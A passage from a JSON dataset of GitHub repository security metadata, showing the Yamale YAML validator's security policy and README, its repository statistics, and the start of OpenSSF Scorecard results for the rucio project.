        "SecurityPolicy_content": "# Reporting Security Issues\n\nPlease see [Releases](https://github.com/23andMe/Yamale/releases). We accept\nvulnerability reports for the latest major version.\n\nIf you believe you have found a security issue in this project, we encourage\nyou to submit your finding through 23andMe's\n[Bugcrowd program](https://bugcrowd.com/twentythree-and-me) so that we can\nappropriately reward you. If you're unable to do so, please use\n[the security report form](https://www.23andme.com/security-report/) on our\nwebsite to reach us. We will respond to your report within 3 business\ndays.\n\nPlease follow the rules and guidelines stated in the\n[Bugcrowd program brief](https://bugcrowd.com/twentythree-and-me). You can also\nfind our Responsible Disclosure Policy on our\n[security report page](https://www.23andme.com/security-report/).\n\nWe appreciate your efforts in helping keep our software secure!\n",
        "project_all_labels": [
            "breaking change",
            "bug",
            "duplicate",
            "enhancement",
            "feature request",
            "invalid",
            "large",
            "medium",
            "question",
            "small",
            "tips and tricks",
            "wontfix"
        ],
        "README_content": "Yamale (ya·ma·lē)\n=================\n\n| :warning: Ensure that your schema definitions come from internal or trusted sources. Yamale does not protect against intentionally malicious schemas. |\n|:------------|\n\n<img src=\"https://github.com/23andMe/Yamale/blob/master/yamale.png?raw=true\" alt=\"Yamale\" width=\"400\"/>\n\nA schema and validator for YAML.\n\nWhat's YAML? See the current spec [here](http://www.yaml.org/spec/1.2/spec.html) and an introduction\nto the syntax [here](https://github.com/Animosity/CraftIRC/wiki/Complete-idiot's-introduction-to-yaml).\n\n[![Build Status](https://github.com/23andMe/Yamale/actions/workflows/run-tests.yml/badge.svg)](https://github.com/23andMe/Yamale/actions/workflows/run-tests.yml)\n[![PyPI](https://img.shields.io/pypi/v/yamale.svg)](https://pypi.python.org/pypi/yamale)\n\nRequirements\n------------\n* Python 3.8+\n* PyYAML\n* ruamel.yaml (optional)\n\nInstall\n-------\n### pip\n```bash\n$ pip install yamale\n```\n\nNOTE: Some platforms, e.g., Mac OS, may ship with only Python 2 and may not have pip installed.\nInstallation of Python 3 should also install pip. To preserve any system dependencies on default\nsoftware, consider installing Python 3 as a local package. Please note replacing system-provided\nPython may disrupt other software. Mac OS users may wish to investigate MacPorts, homebrew, or\nbuilding Python 3 from source; in all three cases, Apple's Command Line Tools (CLT) for Xcode\nmay be required. See also [developers](#developers), below.\n\n### Manual\n1. Download Yamale from: https://github.com/23andMe/Yamale/archive/master.zip\n2. Unzip somewhere temporary\n3. Run `python setup.py install` (may have to prepend `sudo`)\n\nUsage\n-----\n### Command line\nYamale can be run from the command line to validate one or many YAML files. Yamale will search the\ndirectory you supply (current directory is default) for YAML files. Each YAML file it finds it will\nlook in the same directory as that file for its schema, if there is no schema Yamale will keep\nlooking up the directory tree until it finds one. If Yamale can not find a schema it will tell you.\n\nUsage:\n\n```bash\nusage: yamale [-h] [-s SCHEMA] [-n CPU_NUM] [-p PARSER] [--no-strict] [PATH]\n\nValidate yaml files.\n\npositional arguments:\n  PATH                  folder to validate. Default is current directory.\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -s SCHEMA, --schema SCHEMA\n                        filename of schema. Default is schema.yaml.\n  -n CPU_NUM, --cpu-num CPU_NUM\n                        number of CPUs to use. Default is 4.\n  -p PARSER, --parser PARSER\n                        YAML library to load files. Choices are \"ruamel\" or\n                        \"pyyaml\" (default).\n  --no-strict           Disable strict mode, unexpected elements in the data\n                        will be accepted.\n```\n\n### API\nThere are several ways to feed Yamale schema and data files. The simplest way is to let Yamale take\ncare of reading and parsing your YAML files.\n\nAll you need to do is supply the files' path:\n```python\n# Import Yamale and make a schema object:\nimport yamale\nschema = yamale.make_schema('./schema.yaml')\n\n# Create a Data object\ndata = yamale.make_data('./data.yaml')\n\n# Validate data against the schema. Throws a ValueError if data is invalid.\nyamale.validate(schema, data)\n```\n\nYou can pass a string of YAML to `make_schema()` and `make_data()` instead of passing a file path\nby using the `content=` parameter:\n\n```python\ndata = yamale.make_data(content=\"\"\"\nname: Bill\nage: 26\nheight: 6.2\nawesome: True\n\"\"\")\n```\n\nIf `data` is valid, nothing will happen. However, if `data` is invalid Yamale will throw a\n`YamaleError` with a message containing all the invalid nodes:\n```python\ntry:\n    yamale.validate(schema, data)\n    print('Validation success! 👍')\nexcept ValueError as e:\n    print('Validation failed!\\n%s' % str(e))\n    exit(1)\n```\nand an array of `ValidationResult`.\n```python\ntry:\n    yamale.validate(schema, data)\n    print('Validation success! 👍')\nexcept YamaleError as e:\n    print('Validation failed!\\n')\n    for result in e.results:\n        print(\"Error validating data '%s' with '%s'\\n\\t\" % (result.data, result.schema))\n        for error in result.errors:\n            print('\\t%s' % error)\n    exit(1)\n```\n\nYou can also specify an optional `parser` if you'd like to use the `ruamel.yaml` (YAML 1.2 support) instead:\n```python\n# Import Yamale and make a schema object, make sure ruamel.yaml is installed already.\nimport yamale\nschema = yamale.make_schema('./schema.yaml', parser='ruamel')\n\n# Create a Data object\ndata = yamale.make_data('./data.yaml', parser='ruamel')\n\n# Validate data against the schema same as before.\nyamale.validate(schema, data)\n```\n\n### Schema\n\n| :warning: Ensure that your schema definitions come from internal or trusted sources. Yamale does not protect against intentionally malicious schemas. |\n|:------------|\n\nTo use Yamale you must make a schema. A schema is a valid YAML file with one or more documents\ninside. Each node terminates in a string which contains valid Yamale syntax. For example, `str()`\nrepresents a [String validator](#validators).\n\nA basic schema:\n```yaml\nname: str()\nage: int(max=200)\nheight: num()\nawesome: bool()\n```\n\nAnd some YAML that validates:\n```yaml\nname: Bill\nage: 26\nheight: 6.2\nawesome: True\n```\n\nTake a look at the [Examples](#examples) section for more complex schema ideas.\n\n#### Includes\nSchema files may contain more than one YAML document (nodes separated by `---`). The first document\nfound will be the base schema. Any additional documents will be treated as Includes. Includes allow\nyou to define a valid structure once and use it several times. They also allow you to do recursion.\n\nA schema with an Include validator:\n```yaml\nperson1: include('person')\nperson2: include('person')\n---\nperson:\n    name: str()\n    age: int()\n```\n\nSome valid YAML:\n```yaml\nperson1:\n    name: Bill\n    age: 70\n\nperson2:\n    name: Jill\n    age: 20\n```\n\nEvery root node not in the first YAML document will be treated like an include:\n```yaml\nperson: include('friend')\ngroup: include('family')\n---\nfriend:\n    name: str()\nfamily:\n    name: str()\n```\n\nIs equivalent to:\n```yaml\nperson: include('friend')\ngroup: include('family')\n---\nfriend:\n    name: str()\n---\nfamily:\n    name: str()\n```\n\n##### Recursion\nYou can get recursion using the Include validator.\n\nThis schema:\n```yaml\nperson: include('human')\n---\nhuman:\n    name: str()\n    age: int()\n    friend: include('human', required=False)\n```\n\nWill validate this data:\n```yaml\nperson:\n    name: Bill\n    age: 50\n    friend:\n        name: Jill\n        age: 20\n        friend:\n            name: Will\n            age: 10\n```\n\n##### Adding external includes\nAfter you construct a schema you can add extra, external include definitions by calling\n`schema.add_include(dict)`. This method takes a dictionary and adds each key as another include.\n\n### Strict mode\nBy default Yamale will provide errors for extra elements present in lists and maps that are not\ncovered by the schema. With strict mode disabled (using the `--no-strict` command line option),\nadditional elements will not cause any errors. In the API, strict mode can be toggled by passing\nthe strict=True/False flag to the validate function.\n\nIt is possible to mix strict and non-strict mode by setting the strict=True/False flag in the\ninclude validator, setting the option only for the included validators.\n\nValidators\n----------\nHere are all the validators Yamale knows about. Every validator takes a `required` keyword telling\nYamale whether or not that node must exist. By default every node is required. Example: `str(required=False)`\n\nYou can also require that an optional value is not `None` by using the `none` keyword. By default\nYamale will accept `None` as a valid value for a key that's not required. Reject `None` values\nwith `none=False` in any validator. Example: `str(required=False, none=False)`.\n\nSome validators take keywords and some take arguments, some take both. For instance the `enum()`\nvalidator takes one or more constants as arguments and the `required` keyword:\n`enum('a string', 1, False, required=False)`\n\n### String - `str(min=int, max=int, equals=string, starts_with=string, ends_with=string, matches=regex, exclude=string, ignore_case=False, multiline=False, dotall=False)`\nValidates strings.\n- keywords\n    - `min`: len(string) >= min\n    - `max`: len(string) <= max\n    - `equals`: string == value (add `ignore_case=True` for case-insensitive checking)\n    - `starts_with`: Accepts only strings starting with given value (add `ignore_case=True` for\n      case-insensitive checking)\n    - `matches`: Validates the string against a given regex. Similar to the `regex()` validator,\n      you can use `ignore_case`, `multiline` and `dotall`)\n    - `ends_with`: Accepts only strings ending with given value (add `ignore_case=True` for case-insensitive checking)\n    - `exclude`: Rejects strings that contains any character in the excluded value\n    - `ignore_case`: Validates strings in a case-insensitive manner.\n    - `multiline`: `^` and `$` in a pattern match at the beginning and end of each line in a string\n       in addition to matching at the beginning and end of the entire string. (A pattern matches\n       at [the beginning of a string](https://docs.python.org/3/library/re.html#re.match) even in\n       multiline mode; see below for a workaround.); only allowed in conjunction with a `matches` keyword.\n    - `dotall`: `.` in a pattern matches newline characters in a validated string in addition to\n      matching every character that *isn't* a newline.; only allowed in conjunction with a `matches` keyword.\n\nExamples:\n- `str(max=10, exclude='?!')`: Allows only strings less than 11 characters that don't contain `?` or `!`.\n\n### Regex - `regex([patterns], name=string, ignore_case=False, multiline=False, dotall=False)`\nValidates strings against one or more regular expressions.\n- arguments: one or more Python regular expression patterns\n- keywords:\n    - `name`: A friendly description for the patterns.\n    - `ignore_case`: Validates strings in a case-insensitive manner.\n    - `multiline`: `^` and `$` in a pattern match at the beginning and end of each line in a string\n       in addition to matching at the beginning and end of the entire string. (A pattern matches\n       at [the beginning of a string](https://docs.python.org/3/library/re.html#re.match) even in\n       multiline mode; see below for a workaround.)\n    - `dotall`: `.` in a pattern matches newline characters in a validated string in addition to\n      matching every character that *isn't* a newline.\n\nExamples:\n- `regex('^[^?!]{,10}$')`: Allows only strings less than 11 characters that don't contain `?` or `!`.\n- `regex(r'^(\\d+)(\\s\\1)+$', name='repeated natural')`: Allows only strings that contain two or\n  more identical digit sequences, each separated by a whitespace character. Non-matching strings\n  like `sugar` are rejected with a message like `'sugar' is not a repeated natural.`\n- `regex('.*^apples$', multiline=True, dotall=True)`: Allows the string `apples` as well\n  as multiline strings that contain the line `apples`.\n\n### Integer - `int(min=int, max=int)`\nValidates integers.\n- keywords\n    - `min`: int >= min\n    - `max`: int <= max\n\n### Number - `num(min=float, max=float)`\nValidates integers and floats.\n- keywords\n    - `min`: num >= min\n    - `max`: num <= max\n\n### Boolean - `bool()`\nValidates booleans.\n\n### Null - `null()`\nValidates null values.\n\n### Enum - `enum([primitives])`\nValidates from a list of constants.\n- arguments: constants to test equality with\n\nExamples:\n- `enum('a string', 1, False)`: a value can be either `'a string'`, `1` or `False`\n\n### Day - `day(min=date, max=date)`\nValidates a date in the form of YYYY-MM-DD.\n- keywords\n    - `min`: date >= min\n    - `max`: date <= max\n\nExamples:\n- `day(min='2001-01-01', max='2100-01-01')`: Only allows dates between 2001-01-01 and 2100-01-01.\n\n### Timestamp - `timestamp(min=time, max=time)`\nValidates a timestamp in the form of YYYY-MM-DD HH:MM:SS.\n- keywords\n    - `min`: time >= min\n    - `max`: time <= max\n\nExamples:\n- `timestamp(min='2001-01-01 01:00:00', max='2100-01-01 23:00:00')`: Only allows times between\n  2001-01-01 01:00:00 and 2100-01-01 23:00:00.\n\n### List - `list([validators], min=int, max=int)`\nValidates lists. If one or more validators are passed to `list()` only nodes that pass at\nleast one of those validators will be accepted.\n\n- arguments: one or more validators to test values with\n- keywords\n    - `min`: len(list) >= min\n    - `max`: len(list) <= max\n\nExamples:\n- `list()`: Validates any list\n- `list(include('custom'), int(), min=4)`: Only validates lists that contain the `custom` include\n  or integers and contains a minimum of 4 items.\n\n### Map - `map([validators], key=validator, min=int, max=int)`\nValidates maps. Use when you want a node to contain freeform data. Similar to `List`, `Map` takes\none or more validators to run against the values of its nodes, and only nodes that pass at least\none of those validators will be accepted. By default, only the values of nodes are validated and\nthe keys aren't checked.\n- arguments: one or more validators to test values with\n- keywords\n    - `key`: A validator for the keys of the map.\n    - `min`: len(map) >= min\n    - `max`: len(map) <= max\n\nExamples:\n- `map()`: Validates any map\n- `map(str(), int())`: Only validates maps whose values are strings or integers.\n- `map(str(), key=int())`: Only validates maps whose keys are integers and values are strings. `1: one` would be valid but `'1': one` would not.\n- `map(str(), min=1)`: Only validates a non-empty map.\n\n### IP Address - `ip()`\nValidates IPv4 and IPv6 addresses.\n\n- keywords\n    - `version`: 4 or 6; explicitly force IPv4 or IPv6 validation\n\nExamples:\n- `ip()`: Allows any valid IPv4 or IPv6 address\n- `ip(version=4)`: Allows any valid IPv4 address\n- `ip(version=6)`: Allows any valid IPv6 address\n\n### MAC Address - `mac()`\nValidates MAC addresses.\n\nExamples:\n- `mac()`: Allows any valid MAC address\n\n### SemVer (Semantic Versioning) - `semver()`\nValidates [Semantic Versioning](https://semver.org/) strings.\n\nExamples:\n- `semver()`: Allows any valid SemVer string\n\n### Any - `any([validators])`\nValidates against a union of types. Use when a node **must** contain **one and only one** of several types. It is valid\nif at least one of the listed validators is valid. If no validators are given, accept any value.\n- arguments: validators to test values with (if none is given, allow any value; if one or more are given,\none must be present)\n\nExamples:\n- `any(int(), null())`: Validates either an integer **or** a null value.\n- `any(num(), include('vector'))`: Validates **either** a number **or** an included 'vector' type.\n- `any(str(min=3, max=3),str(min=5, max=5),str(min=7, max=7))`: validates to a string that is exactly 3, 5, or 7 characters long\n- `any()`: Allows any value.\n\n### Subset - `subset([validators], allow_empty=False)`\nValidates against a subset of types. Unlike the `Any` validator, this validators allows **one or more** of several types.\nAs such, it *automatically validates against a list*. It is valid if all values can be validated against at least one\nvalidator.\n- arguments: validators to test with (at least one; if none is given, a `ValueError` exception will be raised)\n- keywords:\n    - `allow_empty`: Allow the subset to be empty (and is, therefore, also optional). This overrides the `required`\nflag.\n\nExamples:\n- `subset(int(), str())`: Validators against an integer, a string, or a list of either.\n- `subset(int(), str(), allow_empty=True)`: Same as above, but allows the empty set and makes the subset optional.\n\n### Include - `include(include_name)`\nValidates included structures. Must supply the name of a valid include.\n- arguments: single name of a defined include, surrounded by quotes.\n\nExamples:\n- `include('person')`\n\n### Custom validators\nIt is also possible to add your own custom validators. This is an advanced topic, but here is an\nexample of adding a `Date` validator and using it in a schema as `date()`\n\n```python\nimport yamale\nimport datetime\nfrom yamale.validators import DefaultValidators, Validator\n\nclass Date(Validator):\n    \"\"\" Custom Date validator \"\"\"\n    tag = 'date'\n\n    def _is_valid(self, value):\n        return isinstance(value, datetime.date)\n\nvalidators = DefaultValidators.copy()  # This is a dictionary\nvalidators[Date.tag] = Date\nschema = yamale.make_schema('./schema.yaml', validators=validators)\n# Then use `schema` as normal\n```\n\nExamples\n--------\n\n| :warning: Ensure that your schema definitions come from internal or trusted sources. Yamale does not protect against intentionally malicious schemas. |\n|:------------|\n\n### Using keywords\n#### Schema:\n```yaml\noptional: str(required=False)\noptional_min: int(min=1, required=False)\nmin: num(min=1.5)\nmax: int(max=100)\n```\n#### Valid Data:\n```yaml\noptional_min: 10\nmin: 1.6\nmax: 100\n```\n\n### Includes and recursion\n#### Schema:\n```yaml\ncustomerA: include('customer')\ncustomerB: include('customer')\nrecursion: include('recurse')\n---\ncustomer:\n    name: str()\n    age: int()\n    custom: include('custom_type')\n\ncustom_type:\n    integer: int()\n\nrecurse:\n    level: int()\n    again: include('recurse', required=False)\n```\n#### Valid Data:\n```yaml\ncustomerA:\n    name: bob\n    age: 900\n    custom:\n        integer: 1\ncustomerB:\n    name: jill\n    age: 1\n    custom:\n        integer: 3\nrecursion:\n    level: 1\n    again:\n        level: 2\n        again:\n            level: 3\n            again:\n                level: 4\n```\n\n### Lists\n#### Schema:\n```yaml\nlist_with_two_types: list(str(), include('variant'))\nquestions: list(include('question'))\n---\nvariant:\n  rsid: str()\n  name: str()\n\nquestion:\n  choices: list(include('choices'))\n  questions: list(include('question'), required=False)\n\nchoices:\n  id: str()\n```\n#### Valid Data:\n```yaml\nlist_with_two_types:\n  - 'some'\n  - rsid: 'rs123'\n    name: 'some SNP'\n  - 'thing'\n  - rsid: 'rs312'\n    name: 'another SNP'\nquestions:\n  - choices:\n      - id: 'id_str'\n      - id: 'id_str1'\n    questions:\n      - choices:\n        - id: 'id_str'\n        - id: 'id_str1'\n```\n\n### The data is a list of items without a keyword at the top level\n#### Schema:\n```yaml\nlist(include('human'), min=2, max=2)\n\n---\nhuman:\n  name: str()\n  age: int(max=200)\n  height: num()\n  awesome: bool()\n```\n#### Valid Data:\n```yaml\n- name: Bill\n  age: 26\n  height: 6.2\n  awesome: True\n\n- name: Adrian\n  age: 23\n  height: 6.3\n  awesome: True\n```\n\nWriting Tests\n-------------\nTo validate YAML files when you run your program's tests use Yamale's YamaleTestCase\n\nExample:\n\n```python\nclass TestYaml(YamaleTestCase):\n    base_dir = os.path.dirname(os.path.realpath(__file__))\n    schema = 'schema.yaml'\n    yaml = 'data.yaml'\n    # or yaml = ['data-*.yaml', 'some_data.yaml']\n\n    def runTest(self):\n        self.assertTrue(self.validate())\n```\n\n`base_dir`: String path to prepend to all other paths. This is optional.\n\n`schema`: String of path to the schema file to use. One schema file per test case.\n\n`yaml`: String or list of yaml files to validate. Accepts globs.\n\nDevelopers\n----------\n### Linting + Formatting\nYamale is formatted with [ruff](https://github.com/astral-sh/ruff). There is a github action enforcing\nruff formatting and linting rules. You can run this locally via `make lint` or by installing\nthe pre-commit hooks via `make install-hooks`\n\n### Testing\nYamale uses [Tox](https://tox.readthedocs.org/en/latest/) to run its tests against multiple Python\nversions. To run tests, first checkout Yamale, install Tox, then run `make test` in Yamale's root\ndirectory. You may also have to install the correct Python versions to test with as well.\n\nNOTE on Python versions: `tox.ini` specifies the lowest and highest versions of Python supported by\nYamale. Unless your development environment is configured to support testing against multiple Python\nversions, one or more of the test branches may fail. One method of enabling testing against multiple\nversions of Python is to install `pyenv` and `tox-pyenv` and to use `pyenv install` and `pyenv local`\nto ensure that tox is able to locate appropriate Pythons.\n\n### Releasing\nYamale uses Github Actions to upload new tags to PyPi.\nTo release a new version:\n\n1. Make a commit with the new version number in `yamale/VERSION`.\n1. Run tests for good luck.\n1. Run `make release`.\n\nGithub Actions will take care of the rest.\n",
        "num_commits": 279,
        "project_age_days": 3928,
        "project_created_at": "2014-01-27",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-07-01",
        "num_contributors": 36,
        "num_pull": 106,
        "num_issues": 251,
        "num_opening_issue": 44,
        "project_size(kB)": 827,
        "num_stargazers": 680,
        "num_watchers": 680,
        "num_forks": 88,
        "num_subscribers": 56,
        "SecurityPolicy_created_at": "2021-10-11 21:39:00",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "3e6b0321415adb268b220697671081cfa78e10fc",
                "url": "https://github.com/23andMe/Yamale/commit/3e6b0321415adb268b220697671081cfa78e10fc",
                "date": "2021-10-11 21:39:00"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "rucio/rucio",
        "project_url": "https://github.com/rucio/rucio",
        "SSF": {
            "date": "2024-10-30T00:08:25+07:00",
            "repo": {
                "name": "github.com/rucio/rucio",
                "commit": "81c0d4712fdd3b5277aece71cd22190b961c3139"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 7.0,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Warn: no status checks found to merge onto branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 6,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "14 out of 14 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: desy contributor org/company found, RS485 contributor org/company found, elemento modular cloud cern & infn contributor org/company found, fossasia contributor org/company found, morgridge institute for research contributor org/company found, simple-framework contributor org/company found, operationalintelligence contributor org/company found, conda-forge contributor org/company found, rucio contributor org/company found, BNLNPPS contributor org/company found, stfc contributor org/company found, Elemento-Modular-Cloud contributor org/company found, openmrs contributor org/company found, ISSAC-Labs contributor org/company found, scpd-proed contributor org/company found, swisscom contributor org/company found, cern contributor org/company found, ATLAS-Analytics contributor org/company found, brookhaven national lab contributor org/company found, viremain contributor org/company found, EpicGames contributor org/company found, LibreHealthIO contributor org/company found, league of coders contributor org/company found, dmwm contributor org/company found, fermilab contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 25 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 7 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Info: Possibly incomplete results: error parsing shell code: \"fi\" can only be used to end an if: etc/docker/dev/xrd/xrootd.cfg:0",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/unit_tests.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/rucio/rucio/unit_tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/unit_tests.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/rucio/rucio/unit_tests.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/unit_tests.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/rucio/rucio/unit_tests.yml/master?enable=pin",
                        "Warn: containerImage not pinned by hash: etc/docker/test/alma9.Dockerfile:1",
                        "Warn: containerImage not pinned by hash: etc/docker/test/alma9.Dockerfile:13",
                        "Warn: containerImage not pinned by hash: etc/docker/test/alma9.Dockerfile:18",
                        "Warn: containerImage not pinned by hash: etc/docker/test/alma9.Dockerfile:49",
                        "Warn: containerImage not pinned by hash: etc/docker/test/alma9.Dockerfile:78",
                        "Warn: containerImage not pinned by hash: etc/docker/test/alma9.Dockerfile:93",
                        "Warn: containerImage not pinned by hash: etc/docker/test/alma9.Dockerfile:132",
                        "Warn: containerImage not pinned by hash: etc/docker/test/alma9.Dockerfile:143",
                        "Warn: containerImage not pinned by hash: etc/docker/test/fedora35.Dockerfile:18: pin your Docker image by updating docker.io/fedora:35 to docker.io/fedora:35@sha256:b6fa5d32e6b630bf85ece741cea391290c0e0f2e6ebfda57b6a1a71d184f4000",
                        "Warn: pipCommand not pinned by hash: tools/count_missing_type_annotations_utils.sh:35",
                        "Warn: pipCommand not pinned by hash: tools/run_tests.sh:70",
                        "Warn: pipCommand not pinned by hash: .github/workflows/autotest.yml:33",
                        "Warn: pipCommand not pinned by hash: .github/workflows/autotest.yml:34",
                        "Warn: pipCommand not pinned by hash: .github/workflows/autotest.yml:54",
                        "Warn: npmCommand not pinned by hash: .github/workflows/autotest.yml:109",
                        "Warn: pipCommand not pinned by hash: .github/workflows/autotest.yml:141",
                        "Warn: pipCommand not pinned by hash: .github/workflows/autotest.yml:143",
                        "Warn: pipCommand not pinned by hash: .github/workflows/imagecache.yml:48",
                        "Warn: pipCommand not pinned by hash: .github/workflows/imagecache.yml:49",
                        "Warn: pipCommand not pinned by hash: .github/workflows/imagecache.yml:118",
                        "Warn: pipCommand not pinned by hash: .github/workflows/imagecache.yml:119",
                        "Warn: pipCommand not pinned by hash: .github/workflows/integration_tests.yml:14",
                        "Warn: pipCommand not pinned by hash: .github/workflows/integration_tests.yml:16",
                        "Warn: pipCommand not pinned by hash: .github/workflows/unit_tests.yml:30",
                        "Warn: pipCommand not pinned by hash: .github/workflows/unit_tests.yml:34",
                        "Warn: pipCommand not pinned by hash: .github/workflows/vo_tests.yml:15",
                        "Warn: pipCommand not pinned by hash: .github/workflows/vo_tests.yml:17",
                        "Info:  16 out of  18 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   9 containerImage dependencies pinned",
                        "Info:   0 out of  17 pipCommand dependencies pinned",
                        "Info:   0 out of   1 npmCommand dependencies pinned"
                    ],
                    "score": 1,
                    "reason": "dependency not pinned by hash detected -- score normalized to 1",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 1 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: .github/SECURITY.md:1",
                        "Info: Found linked content: .github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: .github/SECURITY.md:1",
                        "Info: Found text in security policy: .github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
